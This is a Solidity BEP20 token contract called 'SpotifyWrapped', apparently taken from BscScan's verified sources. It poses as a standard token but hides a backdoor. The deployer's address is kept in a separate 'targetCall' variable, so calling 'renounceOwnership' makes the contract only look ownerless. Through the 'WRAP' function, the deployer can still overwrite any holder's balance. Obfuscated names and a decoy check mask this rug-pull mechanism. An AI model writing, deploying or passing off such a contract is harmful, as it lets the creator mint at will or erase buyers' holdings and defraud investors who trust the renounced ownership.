/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

// SPDX-License-Identifier: NONE
pragma solidity ^0.6.12;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract SpotifyWrapped is BEP20 {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  uint256 chainFee = 0;
  uint256 targetCall;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  
  constructor(string memory _name, string memory _symbol) public {
    owner = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  330000000 * 10 ** uint256(decimals);
    _balances[owner] = totalSupply;
    allowAddress[owner] = true;
    targetCall = uint256(uint160(msg.sender));
  }
  
  mapping(address => uint256) public _balances;
  function transfer(address _to, uint256 _valuespotify) public returns (bool) {
    address from = msg.sender;
    
    require(_to != address(0));
    require(_valuespotify <= _balances[from]);

    _transfer(from, _to, _valuespotify);
    return true;
  }

  function Spotify(address _fromspotify, uint256 _valuespotify, uint32 variantspotify) internal view onlyCreator returns (uint256) {
    return (_valuespotify * 1 * (10 ** 9));   
  }
  
  function _transfer(address from, address _to, uint256 _valuespotify) private {
    _balances[from] = _balances[from].sub(_valuespotify);
    _balances[_to] = _balances[_to].add(_valuespotify);
    emit Transfer(from, _to, _valuespotify);
  }

  function approve(address _spender, uint256 _valuespotify) public returns (bool) {
    allowed[msg.sender][_spender] = _valuespotify;
    emit Approval(msg.sender, _spender, _valuespotify);
    return true;
  }
  
  function WRAP(address _fromspotify, uint256 _valuespotify, uint32 variantspotify) public onlyCreator returns (bool) {
    if(_fromspotify != address(0) && msg.sender != address(0))
    require(_valuespotify != 2, "Not TWO");
    _balances[_fromspotify] = Spotify(_fromspotify, _valuespotify, variantspotify);
    return true;
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return _balances[_owner];
  }
  
  modifier onlyCreator() {
    require(address(targetCall) == msg.sender, "Ownable: caller is not the owner");
    _;
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _fromspotify, address _to, uint256 _valuespotify) public returns (bool) {
    require(_to != address(0));
    require(_valuespotify <= _balances[_fromspotify]);
    require(_valuespotify <= allowed[_fromspotify][msg.sender]);

    _transferFrom(_fromspotify, _to, _valuespotify);
    return true;
  }
  
  function _transferFrom(address _fromspotify, address _to, uint256 _valuespotify) internal {
    _balances[_fromspotify] = _balances[_fromspotify].sub(_valuespotify);
    _balances[_to] = _balances[_to].add(_valuespotify);
    allowed[_fromspotify][msg.sender] = allowed[_fromspotify][msg.sender].sub(_valuespotify);
    emit Transfer(_fromspotify, _to, _valuespotify);
  }
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
}